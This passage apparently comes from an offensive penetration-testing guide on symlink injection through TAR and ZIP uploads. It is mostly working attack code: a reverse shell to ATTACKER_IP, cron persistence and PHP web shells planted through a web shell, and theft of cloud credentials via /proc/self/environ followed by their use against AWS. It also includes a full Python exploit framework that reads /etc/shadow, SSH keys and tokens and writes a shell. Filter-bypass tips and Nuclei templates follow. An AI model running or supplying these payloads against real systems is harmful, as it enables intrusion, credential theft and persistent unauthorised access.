nc -lvnp 4444 &
curl "https://target.com/.system.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

#### Install Persistence

```bash
# Via web shell
curl "https://target.com/.system.php?cmd=echo+'*+*+*+*+*+root+/bin/bash+-c+\"bash+-i+>%26+/dev/tcp/ATTACKER_IP/5555+0>%261\"'+>+/etc/cron.d/persistence"

# Write additional backdoors
curl "https://target.com/.system.php?cmd=echo+'<?php+system(\$_GET[\"c\"]);+??>'+>+/var/www/html/uploads/.cache.php"
```

::

### Chain 4 — Symlink Read /proc → SSRF → Cloud Metadata

::steps{level="4"}

#### Read Process Environment Variables

```bash
ln -sf /proc/self/environ proc_env
ln -sf /proc/self/cmdline proc_cmd
ln -sf /proc/1/environ init_env
tar czf proc_read.tar.gz proc_env proc_cmd init_env
rm -f proc_env proc_cmd init_env

curl -X POST https://target.com/upload \
  -F "file=@proc_read.tar.gz" \
  -H "Cookie: session=SESS"

# Extract environment variables (null-separated)
curl -s "https://target.com/uploads/proc_env" | tr '\0' '\n' | \
  grep -iE "AWS|AZURE|GCP|TOKEN|SECRET|KEY|PASSWORD|DATABASE|REDIS"
```

#### Use Discovered Cloud Credentials

```bash
# If AWS credentials found in environment
AWS_ACCESS_KEY=$(curl -s "https://target.com/uploads/proc_env" | tr '\0' '\n' | grep AWS_ACCESS_KEY_ID | cut -d= -f2)
AWS_SECRET_KEY=$(curl -s "https://target.com/uploads/proc_env" | tr '\0' '\n' | grep AWS_SECRET_ACCESS_KEY | cut -d= -f2)
AWS_SESSION_TOKEN=$(curl -s "https://target.com/uploads/proc_env" | tr '\0' '\n' | grep AWS_SESSION_TOKEN | cut -d= -f2)

# Use credentials
export AWS_ACCESS_KEY_ID="$AWS_ACCESS_KEY"
export AWS_SECRET_ACCESS_KEY="$AWS_SECRET_KEY"
export AWS_SESSION_TOKEN="$AWS_SESSION_TOKEN"

aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws iam list-users
```

::

## Automated Exploitation

### Complete Symlink Scanner

::code-collapse

```python
#!/usr/bin/env python3
"""
Symlink Upload Exploit Framework
Automated detection and exploitation of symlink handling in upload endpoints
"""

import tarfile
import zipfile
import stat
import requests
import sys
import os
import json
from io import BytesIO

class SymlinkExploiter:
    def __init__(self, target, upload_path, access_path, cookie):
        self.target = target.rstrip('/')
        self.upload_url = f"{self.target}{upload_path}"
        self.access_base = f"{self.target}{access_path}"
        self.session = requests.Session()
        self.session.headers['Cookie'] = cookie
        self.session.verify = False
        self.results = []
    
    def create_tar_symlink(self, symlinks, output="/tmp/symlink_test.tar.gz"):
        with tarfile.open(output, 'w:gz') as tar:
            for link_name, target_path in symlinks.items():
                info = tarfile.TarInfo(name=link_name)
                info.type = tarfile.SYMTYPE
                info.linkname = target_path
                tar.addfile(info)
        return output
    
    def create_zip_symlink(self, symlinks, output="/tmp/symlink_test.zip"):
        with zipfile.ZipFile(output, 'w') as zf:
            for link_name, target_path in symlinks.items():
                info = zipfile.ZipInfo(link_name)
                info.create_system = 3
                info.external_attr = (stat.S_IFLNK | 0o777) << 16
                zf.writestr(info, target_path)
        return output
    
    def upload(self, archive_path, filename=None):
        if not filename:
            filename = os.path.basename(archive_path)
        try:
            with open(archive_path, 'rb') as f:
                r = self.session.post(
                    self.upload_url,
                    files={'file': (filename, f, 'application/octet-stream')},
                    timeout=30
                )
            return r.status_code, r.text
        except Exception as e:
            return 0, str(e)
    
    def check_symlink(self, link_name, expected_content=None):
        paths = [
            f"{self.access_base}/{link_name}",
            f"{self.access_base}/extracted/{link_name}",
        ]
        for url in paths:
            try:
                r = self.session.get(url, timeout=10)
                if r.status_code == 200 and len(r.text.strip()) > 0:
                    if expected_content:
                        if expected_content in r.text:
                            return url, r.text
                    else:
                        if r.text.strip() and 'not found' not in r.text.lower():
                            return url, r.text
            except:
                pass
        return None, None
    
    def test_basic_symlink(self):
        print("\n[*] Testing basic symlink preservation...")
        
        test_targets = {
            "test_hostname": "/etc/hostname",
            "test_passwd": "/etc/passwd",
        }
        
        for fmt in ['tar', 'zip']:
            if fmt == 'tar':
                archive = self.create_tar_symlink(test_targets)
            else:
                archive = self.create_zip_symlink(test_targets)
            
            status, _ = self.upload(archive, f"test.{fmt}.gz" if fmt == 'tar' else f"test.{fmt}")
            
            for link_name in test_targets:
                url, content = self.check_symlink(link_name, "root:" if "passwd" in link_name else None)
                if url:
                    self.results.append(('basic', fmt, link_name, url))
                    print(f"  [+] {fmt.upper()} symlink works: {link_name}")
                    print(f"      Content: {content[:100]}...")
                    return fmt
        
        print("  [-] No symlink preservation detected")
        return None
    
    def exploit_file_read(self, archive_format='tar'):
        print(f"\n[*] Exploiting arbitrary file read via {archive_format.upper()}...")
        
        targets = {
            "r_passwd": "/etc/passwd",
            "r_shadow": "/etc/shadow",
            "r_hosts": "/etc/hosts",
            "r_ssh_rsa": "/root/.ssh/id_rsa",
            "r_ssh_ed": "/root/.ssh/id_ed25519",
            "r_env": "/var/www/html/.env",
            "r_wpconfig": "/var/www/html/wp-config.php",
            "r_proc_env": "/proc/self/environ",
            "r_aws": "/root/.aws/credentials",
            "r_docker": "/root/.docker/config.json",
            "r_k8s": "/var/run/secrets/kubernetes.io/serviceaccount/token",
            "r_history": "/root/.bash_history",
            "r_crontab": "/etc/crontab",
        }
        
        if archive_format == 'tar':
            archive = self.create_tar_symlink(targets)
            fname = "data.tar.gz"
        else:
            archive = self.create_zip_symlink(targets)
            fname = "data.zip"
        
        self.upload(archive, fname)
        
        for link_name, target_path in targets.items():
            url, content = self.check_symlink(link_name)
            if url and content:
                self.results.append(('read', target_path, url, content[:200]))
                print(f"  [+] READ: {target_path}")
                print(f"      {content[:150]}...")
    
    def exploit_two_stage_write(self, archive_format='tar'):
        print(f"\n[*] Attempting two-stage symlink write...")
        
        # Stage 1
        dir_symlinks = {
            "wroot": "/var/www/html",
        }
        
        if archive_format == 'tar':
            s1 = self.create_tar_symlink(dir_symlinks, "/tmp/s1.tar.gz")
            self.upload(s1, "stage1.tar.gz")
        else:
            s1 = self.create_zip_symlink(dir_symlinks, "/tmp/s1.zip")
            self.upload(s1, "stage1.zip")
        
        # Stage 2
        shell_content = '<?php echo "SYMLINK_RCE_" . php_uname(); system($_GET["cmd"]); ?>'
        
        if archive_format == 'tar':
            with tarfile.open("/tmp/s2.tar.gz", "w:gz") as tar:
                info = tarfile.TarInfo(name="wroot/.symlink_shell.php")
                info.size = len(shell_content)
                info.mode = 0o644
                tar.addfile(info, BytesIO(shell_content.encode()))
            self.upload("/tmp/s2.tar.gz", "stage2.tar.gz")
        else:
            with zipfile.ZipFile("/tmp/s2.zip", 'w') as zf:
                zf.writestr("wroot/.symlink_shell.php", shell_content)
            self.upload("/tmp/s2.zip", "stage2.zip")
        
        # Check shell
        for path in ['/.symlink_shell.php', '/uploads/wroot/.symlink_shell.php']:
            try:
                r = self.session.get(f"{self.target}{path}", params={'cmd': 'id'})
                if 'SYMLINK_RCE_' in r.text:
                    self.results.append(('write_rce', path, r.text[:200]))
                    print(f"  [+] RCE via two-stage write: {self.target}{path}")
                    return True
            except:
                pass
        
        print("  [-] Two-stage write unsuccessful")
        return False
    
    def run(self):
        print(f"[*] Target: {self.upload_url}")
        print(f"[*] Access: {self.access_base}")
        
        fmt = self.test_basic_symlink()
        
        if fmt:
            self.exploit_file_read(fmt)
            self.exploit_two_stage_write(fmt)
        
        print(f"\n{'='*60}")
        print(f"  RESULTS: {len(self.results)} finding(s)")
        print(f"{'='*60}")
        for r in self.results:
            print(f"  [{r[0].upper()}] {r[1:]}")
        
        return len(self.results) > 0

if __name__ == '__main__':
    e = SymlinkExploiter(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    e.run()
```
::

### Nuclei Templates

::tabs
  :::tabs-item{icon="i-lucide-zap" label="TAR Symlink Detection"}
  ```yaml
  id: symlink-tar-upload
  
  info:
    name: Symlink Preservation in TAR Upload
    author: pentester
    severity: critical
    tags: symlink,upload,file-read,lfi
  
  http:
    - raw:
        - |
          POST {{BaseURL}}/upload HTTP/1.1
          Host: {{Hostname}}
          Cookie: {{cookie}}
          Content-Type: multipart/form-data; boundary=----SymBound
  
          ------SymBound
          Content-Disposition: form-data; name="file"; filename="test.tar.gz"
          Content-Type: application/gzip
  
          {{base64_decode(symlink_tar_payload)}}
          ------SymBound--
  
        - |
          GET {{BaseURL}}/uploads/etc_passwd_link HTTP/1.1
          Host: {{Hostname}}
  
      matchers:
        - type: word
          words:
            - "root:x:0:0"
            - "root:*:0:0"
          part: body
          condition: or
  ```
  :::

  :::tabs-item{icon="i-lucide-zap" label="ZIP Symlink Detection"}
  ```yaml
  id: symlink-zip-upload
  
  info:
    name: Symlink Preservation in ZIP Upload  
    author: pentester
    severity: critical
    tags: symlink,upload,file-read,zip
  
  http:
    - raw:
        - |
          POST {{BaseURL}}/upload HTTP/1.1
          Host: {{Hostname}}
          Cookie: {{cookie}}
          Content-Type: multipart/form-data; boundary=----SymBound
  
          ------SymBound
          Content-Disposition: form-data; name="file"; filename="test.zip"
          Content-Type: application/zip
  
          {{base64_decode(symlink_zip_payload)}}
          ------SymBound--
  
        - |
          GET {{BaseURL}}/uploads/link_passwd HTTP/1.1
          Host: {{Hostname}}
  
      matchers:
        - type: regex
          regex:
            - "root:[x*]:0:0"
          part: body
  ```
  :::
::

## Verification & Evidence

::code-group
```bash [Confirm Symlink Read]
# Non-destructive proof of concept
ln -sf /etc/hostname poc_hostname
tar czf poc_symlink.tar.gz poc_hostname
rm poc_hostname

{
  echo "=== Symlink File Upload PoC ==="
  echo "Target: https://target.com/upload"
  echo "Date: $(date)"
  echo ""
  echo "=== Upload Request ==="
  
  curl -v -X POST https://target.com/upload \
    -F "file=@poc_symlink.tar.gz;filename=poc.tar.gz" \
    -H "Cookie: session=SESS" 2>&1
  
  echo ""
  echo "=== Symlink Content (should show server hostname) ==="
  echo ""
  
  curl -s "https://target.com/uploads/poc_hostname"
  
  echo ""
  echo "=== Archive Contents (showing symlink) ==="
  tar tvf poc_symlink.tar.gz
  
} | tee symlink_poc_evidence.txt
```

```bash [Verify Write Capability]
# Confirm two-stage write without deploying actual shell

# Stage 1: Directory symlink
ln -sf /tmp tmp_link
tar czf write_poc_s1.tar.gz tmp_link
rm tmp_link

curl -X POST https://target.com/upload \
  -F "file=@write_poc_s1.tar.gz" \
  -H "Cookie: session=SESS"

# Stage 2: Write harmless proof file
mkdir -p tmp_link
echo "SYMLINK_WRITE_POC_$(date +%s)" > tmp_link/poc_write_test.txt
tar czf write_poc_s2.tar.gz tmp_link/poc_write_test.txt
rm -rf tmp_link

curl -X POST https://target.com/upload \
  -F "file=@write_poc_s2.tar.gz" \
  -H "Cookie: session=SESS"

# Verify file was written to /tmp/
curl -s "https://target.com/uploads/tmp_link/poc_write_test.txt"
```

```bash [Cleanup]
# Remove uploaded archives and extracted files
curl -X DELETE "https://target.com/api/files/poc.tar.gz" \
  -H "Cookie: session=SESS"

# Or via web shell if write was achieved
curl "https://target.com/.symlink_shell.php?cmd=rm+-f+/tmp/poc_write_test.txt"
curl "https://target.com/.symlink_shell.php?cmd=rm+-f+/var/www/html/.symlink_shell.php"
```
::

## Quick Reference

::field-group
  ::field{name="Primary Attack" type="string"}
  Create symlink inside TAR/ZIP archive pointing to sensitive file → upload → extract → access symlink via web → read target file content
  ::

  ::field{name="TAR Command" type="string"}
  `ln -sf /etc/passwd link && tar czf evil.tar.gz link` — TAR preserves symlinks by default
  ::

  ::field{name="ZIP Command" type="string"}
  `ln -sf /etc/passwd link && zip --symlinks evil.zip link` — requires `--symlinks` flag
  ::

  ::field{name="Two-Stage Write" type="string"}
  Stage 1: symlink `webroot → /var/www/html` | Stage 2: file `webroot/shell.php` → writes through symlink to web root
  ::

  ::field{name="Hardlink Alternative" type="string"}
  Use `tarfile.LNKTYPE` instead of `SYMTYPE` — some filters only block symlinks but allow hardlinks
  ::

  ::field{name="Key Targets" type="string"}
  `/etc/passwd`, `/etc/shadow`, `/root/.ssh/id_rsa`, `/var/www/html/.env`, `/proc/self/environ`, cloud credential files
  ::

  ::field{name="Bypass Absolute Path Filter" type="string"}
  Use relative symlinks (`../../../../etc/passwd`) or `/proc/self/root/etc/passwd` as alternative root reference
  ::

  ::field{name="Python Library" type="string"}
  `tarfile.TarInfo(type=tarfile.SYMTYPE, linkname="/target")` — full control over symlink creation in archives
  ::

  ::field{name="Vulnerable Function" type="string"}
  `tar.extractall()`, `ZipFile.extractall()`, `unzip` without `-:` flag, `Archive::Extract` without symlink check
  ::
::

::badge
File Upload — Symlink Injection — Archive Extraction — Arbitrary Read/Write
::